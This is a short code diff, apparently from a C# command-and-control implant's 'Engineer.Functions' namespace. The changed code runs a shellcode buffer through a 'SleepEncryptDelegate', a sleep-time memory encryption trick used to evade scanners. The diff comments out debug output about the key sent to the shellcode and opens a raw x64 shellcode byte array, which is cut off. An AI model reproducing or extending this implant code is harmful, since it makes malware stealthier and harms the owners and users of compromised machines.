@@ -148,16 +148,14 @@ namespace Engineer.Functions
                     int size = Marshal.SizeOf(pARAMS);
                     IntPtr arrPtr = Marshal.AllocHGlobal(size);
                     Marshal.StructureToPtr(pARAMS, arrPtr, false);
-                    Console.WriteLine($"sending random key of {random_char} to the shellcode");
+                    //Console.WriteLine($"sending random key of {random_char} to the shellcode");
                     SleepEncryptDelegate Run = (SleepEncryptDelegate)Marshal.GetDelegateForFunctionPointer(buffer, typeof(SleepEncryptDelegate));
                     int ReturnValue = Run(arrPtr);
-                    Console.WriteLine(ReturnValue);
+                    //Console.WriteLine(ReturnValue);
                     Marshal.FreeHGlobal(arrPtr);
                 }
                 else
                 {
-
-
                     byte[] shellcode_bin_old = {
                           0x57, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
                           0xe8, 0x8f, 0x02, 0x00, 0x00, 0x48, 0x89, 0xfc, 0x5f, 0xc3, 0x66, 0x2e,
